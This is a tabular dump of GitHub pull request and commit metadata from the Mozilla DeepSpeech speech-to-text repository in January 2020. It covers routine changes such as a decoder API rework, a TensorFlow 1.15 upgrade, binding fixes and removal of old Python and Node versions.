1467,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2693,2693,Make JavaScript binding handle Buffer length adjustment,,reuben,477142,2020-01-27T17:26:13Z,MEMBER,False,9,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8d42c2bdd9530d37b76586ea5dc821bfc108926a,Adjust Buffer length to account for element size inside the JS binding
1468,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2693,2693,Make JavaScript binding handle Buffer length adjustment,,reuben,477142,2020-01-27T17:26:13Z,MEMBER,False,9,7,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7c807d01ebd71f0483db08e4711de58c472213f9,Point to updated examples
1469,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2690,2690,added an argument to choose the final export model name,"When training models i felt like an argument was missing to choose the name of the export model when done training.
use as:
```
python -u DeepSpeech.py --noshow_progressbar \
   --train_files data/ldc93s1/ldc93s1.csv \
   --test_files data/ldc93s1/ldc93s1.csv \
   --train_batch_size 1 \
   --test_batch_size 1 \
   --n_hidden 200 \
   --epochs 200 \
   --export_name name_of_model \
```
if no arg is given it will just use output_graph as name",PedroDKE,43861296,2020-01-25T12:20:03Z,CONTRIBUTOR,True,2,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3e349497ed369d0aab75082a20453d89c0f030f7,added an argument to choose the final export model name
1470,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2688,2688,Specify upper frequency limit when computing Mfccs,,reuben,477142,2020-01-24T09:24:15Z,MEMBER,True,5,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,709cd0d2f2ceb819c5e130baf3c82789ea7fb96a,Specify upper frequency limit when computing Mfccs
1471,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2688,2688,Specify upper frequency limit when computing Mfccs,,reuben,477142,2020-01-24T09:24:15Z,MEMBER,True,5,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9735d066c5749c4de0ac00d2e2905f18787bd521,Bump graph version
1472,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2686,2686,Ensure properly link to TensorFlow r1.15,,lissyx,1645737,2020-01-22T09:07:01Z,COLLABORATOR,True,10,10,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d9072c2a87ddf48c0c9cab7d2db175ddf29dc5fb,Ensure properly link to TensorFlow r1.15
1473,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2685,2685,Update TRAINING.rst  (mmap-able model),"I had this ""command not found"" problem and solved it with https://discourse.mozilla.org/t/how-to-create-a-mmap-able-model-from-the-output-graph-pb-file/28984/13?, so I'm adding it to the documentation.",juandspy,42124482,2020-01-22T08:00:00Z,CONTRIBUTOR,True,5,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,685c1f7c1b211d42a3539a0e05c5b3895881473b,"Update TRAINING.rst  (mmap-able model)

I had this ""command not found"" problem and solved it with https://discourse.mozilla.org/t/how-to-create-a-mmap-able-model-from-the-output-graph-pb-file/28984/13?, so I'm adding it to the documentation."
1474,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2685,2685,Update TRAINING.rst  (mmap-able model),"I had this ""command not found"" problem and solved it with https://discourse.mozilla.org/t/how-to-create-a-mmap-able-model-from-the-output-graph-pb-file/28984/13?, so I'm adding it to the documentation.",juandspy,42124482,2020-01-22T08:00:00Z,CONTRIBUTOR,True,5,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6008d045493777afd68d9dc885cc56ffe04a4be,Update util/taskcluster.py
1475,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2685,2685,Update TRAINING.rst  (mmap-able model),"I had this ""command not found"" problem and solved it with https://discourse.mozilla.org/t/how-to-create-a-mmap-able-model-from-the-output-graph-pb-file/28984/13?, so I'm adding it to the documentation.",juandspy,42124482,2020-01-22T08:00:00Z,CONTRIBUTOR,True,5,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,616760eb52e6e477b73805208c7614e67f76178a,Update TRAINING.rst
1476,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2685,2685,Update TRAINING.rst  (mmap-able model),"I had this ""command not found"" problem and solved it with https://discourse.mozilla.org/t/how-to-create-a-mmap-able-model-from-the-output-graph-pb-file/28984/13?, so I'm adding it to the documentation.",juandspy,42124482,2020-01-22T08:00:00Z,CONTRIBUTOR,True,5,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,29a92e098fcc8d71d1501727daa79ef85dfecb04,"Update taskcluster.py

I copied ``maybe_download_tc_bin`` syntax in order to make the code easier to follow."
1477,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2682,2682,Update evaluate.py,The package ```sys``` was not imported and gives a ```NameError: name 'sys' is not defined``` in line 96 when no test_file was provided. I added the import statement.,juandspy,42124482,2020-01-21T08:59:04Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0e528f52ebbc0a26fd78b11015d36f0ff460d75,"Update evaluate.py

The package ```sys``` was not imported and gives a ```NameError: name 'sys' is not defined``` in line 96 when no test_file was provided. I added the import statement."
1478,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8a06cefd043be970544e7ed929ad5d741fa2b3f1,Update KenLM to b9f35777d112ce2fc10bd3986302517a16dc3883
1479,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dbfd294998a0b49bfd62f4480dbc4f1f4b01089c,Stop including vocabulary data in LM.binary.
1480,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd6c20a22b9c554c752ce438073cfac38e28bec9,Refactor Scorer so model/trie package can be created by an external tool
1481,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e9bcb80a233386c27306f44dc0650e17a054c36,Add generate_package tool to create combined scorer package
1482,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4db606e476d473fd23edf257e08f28dfc969a83f,Load combined format from Scorer
1483,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,00e4c2bd0a249e43902c8c50e8a37ba03b58e924,Write default values for alpha and beta into trie header
1484,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3a686d8eb6543ae071e6f7756d2ff0acc781900e,Change decoder API
1485,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c792b92958241ed8b1295e5e2ee13e41d3f50aa5,Switch to new scorer format
1486,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af15edb5b58fc97df28ccdc71b86c73c518e3609,Switch smoke test scorer to new format
1487,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,494a1f7d524c1f9642b0c23e6de12939fb5ac2a8,Add tool to extract vocabulary from the old LM binary format
1488,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a9163eb409d5bc9f36917596d1cde7af8c301124,Update all API consumers
1489,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5dc4235b242ecbbb70f9f21fc801662db8d93df8,"Fix linter errors

X-DeepSpeech: NOBUILD"
1490,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1c7d9cdefd6fd27932c63cfa4e158ab5f77edfc9,Improve error handling around Scorer loading
1491,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,14aefdf0fcb53cfb5333153bfc4ee3f8357e24cf,Address review comments and update docs
1492,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f4e8986752dfa2edb7359c0c744a4b6544750d30,Address review comments
1493,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0d84923bd7b614116cc618df8518a462e621d36f,Update examples model asset
1494,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2681,2681,Decoder API rework (Fixes #2672),,reuben,477142,2020-01-20T16:55:47Z,MEMBER,False,4820,970,103,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1d5931d85c4b095805c2d4e6471be775c0a9b59f,Temp workaround for Windows failures
1495,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2679,2679,Re-land PR #2548 multistream support for .NET bindings,,reuben,477142,2020-01-18T11:38:00Z,MEMBER,True,120,90,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fe2477b25c3565343b984d1fec38c1c25ac08c17,"Remove unused members

FreeString and FreeMetadata are both private usage only."
1496,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2679,2679,Re-land PR #2548 multistream support for .NET bindings,,reuben,477142,2020-01-18T11:38:00Z,MEMBER,True,120,90,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,923729d920f2d44296e515806aeef18dd4428bf5,"Multi-stream support .NET

Adds multi-stream support for the .NET client using the same acoustic model."
1497,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2677,2677,Arm64 tflite,,lissyx,1645737,2020-01-17T07:44:55Z,COLLABORATOR,True,28,28,28,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c5136fd4ac6e29c5a47fd7ca9853154575e71e28,"Update ARM64 tests against TFLite assets

Fixes #2676"
1498,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2674,2674,Fix word detection for time computation,Fixes #2623,lissyx,1645737,2020-01-14T15:34:37Z,COLLABORATOR,True,9,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,66fe634cfe1cd24664519cf497b2005c573a0c47,"Fix word detection for time computation

Fixes #2623"
1499,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2673,2673,Introducing utils.helpers for miscellaneous helper functions,,tilmankamp,5991088,2020-01-14T15:08:46Z,CONTRIBUTOR,True,21,27,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ad9f0c581bbacf3b3deacc3dfdba6aad3b15d154,Introducing utils.helpers for miscellaneous helper functions
1500,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2668,2668,"Upgrade pip, setuptools and wheel before installing requirements",,reuben,477142,2020-01-13T10:14:39Z,MEMBER,True,4,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,22aabae55a075f781a64fc9c2b5823b5e239d135,"Upgrade pip, setuptools and wheel before installing requirements"
1501,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2668,2668,"Upgrade pip, setuptools and wheel before installing requirements",,reuben,477142,2020-01-13T10:14:39Z,MEMBER,True,4,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,700c9747d92340820245958f116ce844f479a81d,"Pin versions of pip, setuptools, wheel"
1502,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2667,2667,Remove python nodejs oldies,,lissyx,1645737,2020-01-13T09:54:32Z,COLLABORATOR,True,97,1204,142,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,197704b86886be8ee88308f57a9e49a144acb271,"Remove Python 2.7

Fixes #2659"
1503,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2667,2667,Remove python nodejs oldies,,lissyx,1645737,2020-01-13T09:54:32Z,COLLABORATOR,True,97,1204,142,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,03892fb3fda8922b45289204f7b58f23bf343a70,Remove NodeJS < v10
1504,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2667,2667,Remove python nodejs oldies,,lissyx,1645737,2020-01-13T09:54:32Z,COLLABORATOR,True,97,1204,142,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2eaa9e4a18fb1f01223796add4ca6ca3ea13474d,Remove ElectronJS < 5.0 (unsupported)
1505,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2667,2667,Remove python nodejs oldies,,lissyx,1645737,2020-01-13T09:54:32Z,COLLABORATOR,True,97,1204,142,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b216b943b9e334dba56269356a7c083291f53c46,"Update Python, NodeJS and ElectronJS to latest stables"
1506,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2667,2667,Remove python nodejs oldies,,lissyx,1645737,2020-01-13T09:54:32Z,COLLABORATOR,True,97,1204,142,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b18675eae546f221871d53035f241a6b2c84d2b7,Switch to NodeJS v12 (LTS) for build
1507,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2667,2667,Remove python nodejs oldies,,lissyx,1645737,2020-01-13T09:54:32Z,COLLABORATOR,True,97,1204,142,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e4acdd75455f303a915a738f9f10ee52a8e197fe,Remove Homebrew node workaround
1508,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2666,2666,Remove v0.6.0 TFLite prod model workaround,,lissyx,1645737,2020-01-13T09:20:05Z,COLLABORATOR,True,2,14,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d76f1929b078e2fdb87bf588a093783aa3797fa4,Remove v0.6.0 TFLite prod model workaround
1509,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2665,2665,WIP LM/trie experiments,,reuben,477142,2020-01-12T17:38:30Z,MEMBER,False,187,4043,261,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42fe30d572a930394bf9a194c09b4556e74a6c2d,Make evaluate_tflite.py work with relative paths in the CSV
1510,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2665,2665,WIP LM/trie experiments,,reuben,477142,2020-01-12T17:38:30Z,MEMBER,False,187,4043,261,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,33e725bb2560675b59ab4f58b300606c182daf49,Make evaluate_tflite.py work with v0.6.1 calculate_report
1511,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2665,2665,WIP LM/trie experiments,,reuben,477142,2020-01-12T17:38:30Z,MEMBER,False,187,4043,261,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c28f61d370b3f43281463f5113fac0d8e26ffb34,Output full paths to results dump in evaluate_tflite.py
1512,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2665,2665,WIP LM/trie experiments,,reuben,477142,2020-01-12T17:38:30Z,MEMBER,False,187,4043,261,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa66a047982582db8f048cf91cff77f85ae841a2,Update evaluate_tflite requirements
1513,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2665,2665,WIP LM/trie experiments,,reuben,477142,2020-01-12T17:38:30Z,MEMBER,False,187,4043,261,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d0e86fe10a71c80a95de1d5205f02c2e1a1d4a3c,Add a test for evaluate_tflite.py
1514,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2665,2665,WIP LM/trie experiments,,reuben,477142,2020-01-12T17:38:30Z,MEMBER,False,187,4043,261,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7e1f4a2d680be6c54bd5f015150d7d2d4aa394ed,"Fix linter errors

X-DeepSpeech: NOBUILD"
1515,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2665,2665,WIP LM/trie experiments,,reuben,477142,2020-01-12T17:38:30Z,MEMBER,False,187,4043,261,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,575b06b360b9981db84c49b1b6920c52266ecde6,WIP Allow use of Scorer with trie only
1516,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2665,2665,WIP LM/trie experiments,,reuben,477142,2020-01-12T17:38:30Z,MEMBER,False,187,4043,261,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,40fd34a91a475f9f6490520b7b9e08ba7d5c45a3,WIP generate_trie directly from vocabulary file
1517,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2665,2665,WIP LM/trie experiments,,reuben,477142,2020-01-12T17:38:30Z,MEMBER,False,187,4043,261,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a5fb7af5855d1ccdad64ad6839211d896c3a79c7,Add support for order=1 to TrieModel
1518,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2665,2665,WIP LM/trie experiments,,reuben,477142,2020-01-12T17:38:30Z,MEMBER,False,187,4043,261,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0b8c2b44fbb07453a3a901c5347ebe1f62b8dbc4,Leave only Linux build tasks
1519,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2664,2664,evaluate_tflite.py fixes,,reuben,477142,2020-01-12T10:18:51Z,MEMBER,True,106,26,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42fe30d572a930394bf9a194c09b4556e74a6c2d,Make evaluate_tflite.py work with relative paths in the CSV
1520,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2664,2664,evaluate_tflite.py fixes,,reuben,477142,2020-01-12T10:18:51Z,MEMBER,True,106,26,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,33e725bb2560675b59ab4f58b300606c182daf49,Make evaluate_tflite.py work with v0.6.1 calculate_report
1521,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2664,2664,evaluate_tflite.py fixes,,reuben,477142,2020-01-12T10:18:51Z,MEMBER,True,106,26,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c28f61d370b3f43281463f5113fac0d8e26ffb34,Output full paths to results dump in evaluate_tflite.py
1522,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2664,2664,evaluate_tflite.py fixes,,reuben,477142,2020-01-12T10:18:51Z,MEMBER,True,106,26,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa66a047982582db8f048cf91cff77f85ae841a2,Update evaluate_tflite requirements
1523,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2664,2664,evaluate_tflite.py fixes,,reuben,477142,2020-01-12T10:18:51Z,MEMBER,True,106,26,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d0e86fe10a71c80a95de1d5205f02c2e1a1d4a3c,Add a test for evaluate_tflite.py
1524,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2664,2664,evaluate_tflite.py fixes,,reuben,477142,2020-01-12T10:18:51Z,MEMBER,True,106,26,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7e1f4a2d680be6c54bd5f015150d7d2d4aa394ed,"Fix linter errors

X-DeepSpeech: NOBUILD"
1525,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2660,2660,Also apply node@10 workaround to tc-vars.sh,,reuben,477142,2020-01-10T18:45:02Z,MEMBER,False,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,64e1e0fc2286bb5ace6538248e8bdb4b8d376f5c,Also apply node@10 workaround to tc-vars.sh
1526,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2658,2658,Bump version to v0.6.1,,reuben,477142,2020-01-10T14:03:52Z,MEMBER,True,10,10,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fc63ce0c040692a4280af7b506fc53a905d49a2e,Bump version to v0.6.1
1527,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2657,2657,Temp workaround to move to node@10 on Homebrew,,lissyx,1645737,2020-01-10T11:25:46Z,COLLABORATOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3bbed56f1ebc7f1c93f8cef0d7a55bfe4fd8d917,Temp workaround to move to node@10 on Homebrew
1528,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2647,2647,Improve --feature_cache help text (Fixes #1709),"My understanding is that the sample database format will supercede feature caching, but in the mean time here's an improvement for the help text.",reuben,477142,2020-01-10T10:07:16Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e5eedf525236408a38831ad4ac8a40baa9870ea9,"Improve --feature_cache help text

X-DeepSpeech: NOBUILD"
1529,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2645,2645,Update to TensorFlow 1.15,,reuben,477142,2020-01-09T10:39:46Z,MEMBER,True,38,29,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42cb00dafdd4db9f757d987f20c3563e40465118,Switch TF dependency to r1.15 branch
1530,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2645,2645,Update to TensorFlow 1.15,,reuben,477142,2020-01-09T10:39:46Z,MEMBER,True,38,29,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cce1cec7402161cbb634cb79e1684ec8e2b6a909,"Upgrade pip, setuptools and wheel before installing requirements"
1531,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2645,2645,Update to TensorFlow 1.15,,reuben,477142,2020-01-09T10:39:46Z,MEMBER,True,38,29,27,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17597f452656da75c673f72ec978d332cc1ba39b,Fix benchmark_model test
1532,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2644,2644,Fix DS_EnableDecoderWithLM typo in Android bindings,Fixes #2643,lissyx,1645737,2020-01-09T10:22:31Z,COLLABORATOR,True,3,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d911ccb2b7ac5b233a5c8e9524871a70e169083b,"Fix DS_EnableDecoderWithLM typo in Android bindings

Fixes #2643"
1533,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2641,2641,Add script to generate feature cache without training,,reuben,477142,2020-01-08T17:59:59Z,MEMBER,False,51,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,357b4d6c986e43b58468f77433622057789223a5,Add script to generate feature cache without training
1534,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2640,2640,Add 8kHz training test coverage,Fixes #2638,lissyx,1645737,2020-01-08T14:09:57Z,COLLABORATOR,True,1585,546,251,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,581515e094a00c73941fa7f42cc2d1df39dedf9e,"Add 8kHz training test coverage

Fixes #2638"
